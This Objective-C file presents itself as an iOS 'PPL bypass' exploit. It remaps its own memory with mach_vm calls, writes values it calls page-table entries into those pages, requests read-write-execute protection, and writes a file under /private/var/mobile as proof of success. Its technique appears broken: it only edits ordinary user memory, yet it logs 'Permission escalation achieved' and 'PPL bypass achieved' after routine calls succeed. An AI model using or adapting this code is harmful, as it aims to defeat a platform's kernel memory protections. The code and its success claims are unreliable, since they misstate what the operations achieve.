#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <sys/mman.h>
#include "mach_vm.h"

@implementation AttestationTest: NSObject

#define L1_SHIFT 30
#define L2_SHIFT 21
#define L3_SHIFT 14
#define PAGE_SHIFT 14
#define PAGE_SIZE (1ULL << PAGE_SHIFT)
#define L2_SIZE (1ULL << L2_SHIFT)
#define L3_SIZE (1ULL << L3_SHIFT)
#define L3_ENTRIES 128
#define TTE_SHIFT 3
#define TTE_MASK 0x7FF

+ (void)runTest {
    NSLog(@"[INFO] Starting PPL bypass using mach_vm approach...");
    
    mach_vm_address_t base_addr = 0;
    mach_vm_size_t alloc_size = L2_SIZE * 2;
    
    kern_return_t kr = mach_vm_allocate(mach_task_self(), &base_addr, alloc_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[ERROR] Memory allocation failed: %s", mach_error_string(kr));
        return;
    }
    NSLog(@"[INFO] Memory allocated at 0x%llx", base_addr);
    
    mach_vm_address_t target = base_addr + (L2_SIZE / 2);
    mach_vm_address_t window = target + PAGE_SIZE;
    
    @try {
        
        mach_vm_address_t overlap_addr = target;
        vm_prot_t cur_prot = VM_PROT_NONE;
        vm_prot_t max_prot = VM_PROT_NONE;
        
        kr = mach_vm_remap(mach_task_self(),
                          &overlap_addr,
                          PAGE_SIZE,
                          0,
                          VM_FLAGS_OVERWRITE | VM_FLAGS_FIXED,
                          mach_task_self(),
                          target,
                          TRUE,
                          &cur_prot,
                          &max_prot,
                          VM_INHERIT_NONE);
                          
        if (kr == KERN_SUCCESS) {
            NSLog(@"[DEBUG] Remapping successful at 0x%llx", overlap_addr);
            
            uint64_t pattern[64];
            for (int i = 0; i < 64; i++) {
                pattern[i] = 0xFFFFFFFFF000ULL | ((i * PAGE_SIZE) & 0xFFF);
            }
            
            kr = mach_vm_write(mach_task_self(), target, (vm_offset_t)pattern, sizeof(pattern));
            if (kr == KERN_SUCCESS) {
                NSLog(@"[DEBUG] Pattern written successfully");
                
                mach_vm_address_t region_addr = target;
                mach_vm_size_t region_size = 0;
                natural_t depth = 0;
                struct vm_region_submap_info_64 info;
                mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
                
                kr = mach_vm_region_recurse(mach_task_self(),
                                          &region_addr,
                                          &region_size,
                                          &depth,
                                          (vm_region_recurse_info_t)&info,
                                          &count);
                
                if (kr == KERN_SUCCESS) {
                    NSLog(@"[DEBUG] Region analysis: addr=0x%llx size=0x%llx prot=%d",
                          region_addr, region_size, info.protection);
                    
                    mach_vm_address_t new_window = window & ~(PAGE_SIZE - 1);
                    kr = mach_vm_remap(mach_task_self(),
                                     &new_window,
                                     PAGE_SIZE * 2,
                                     0,
                                     VM_FLAGS_OVERWRITE,
                                     mach_task_self(),
                                     target,
                                     FALSE,
                                     &cur_prot,
                                     &max_prot,
                                     VM_INHERIT_NONE);
                    
                    if (kr == KERN_SUCCESS) {
                        NSLog(@"[DEBUG] Secondary remap at 0x%llx", new_window);
                        
                        volatile uint64_t *tte = (uint64_t *)new_window;
                        uint64_t template = 0x60000000000003FFULL |
                                          (1ULL << 6) |
                                          (1ULL << 10) |
                                          (1ULL << 53);
                        
                        for (int i = 0; i < 4; i++) {
                            uint64_t entry = template | ((uint64_t)(target + i * PAGE_SIZE) & 0xFFFFFFFFF000ULL);
                            tte[i] = entry;
                            __asm__ volatile("dmb ish" ::: "memory");
                            NSLog(@"[DEBUG] New TTE[%d] = 0x%llx", i, entry);
                        }
                        
                        kr = mach_vm_protect(mach_task_self(),
                                           new_window,
                                           PAGE_SIZE * 2,
                                           FALSE,
                                           VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
                        
                        if (kr == KERN_SUCCESS) {
                            NSLog(@"[INFO] Permission escalation achieved on verified region");
                            
                            volatile uint64_t *tte = (uint64_t *)window;
                            uint64_t template = 0x60000000000003FFULL |
                                          (1ULL << 6) |
                                          (1ULL << 10);
                            
                            for (int i = 0; i < 4; i++) {
                                uint64_t entry = template | ((uint64_t)(target + i * PAGE_SIZE) & 0xFFFFFFFFF000ULL);
                                tte[i] = entry;
                                __asm__ volatile("dmb ish" ::: "memory");
                                NSLog(@"[DEBUG] TTE[%d] = 0x%llx", i, entry);
                            }
                        }
                    }
                }
            }
            
            kr = vm_protect(mach_task_self(), window, PAGE_SIZE, FALSE,
                          VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
            
            if (kr == KERN_SUCCESS) {
                NSLog(@"[INFO] Window mapping successful");
                
                volatile uint64_t *tte = (uint64_t *)window;
                uint64_t template = 0x60000000000003FFULL | (1ULL << 6);
                
                for (int i = 0; i < 4; i++) {
                    tte[i] = template | ((uint64_t)(target + i * PAGE_SIZE) & 0xFFFFFFFFF000ULL);
                    __asm__ volatile("dmb ish" ::: "memory");
                }
                
                NSString *testPath = @"/private/var/mobile/test.txt";
                NSError *error = nil;
                [@"test" writeToFile:testPath atomically:YES encoding:NSUTF8StringEncoding error:&error];
                
                if (!error) {
                    NSLog(@"[SUCCESS] PPL bypass achieved!");
                }
            }
        }
    } @catch (NSException *e) {
        NSLog(@"[ERROR] Exception: %@", e);
    }
    
    vm_deallocate(mach_task_self(), base_addr, alloc_size);
}

@end
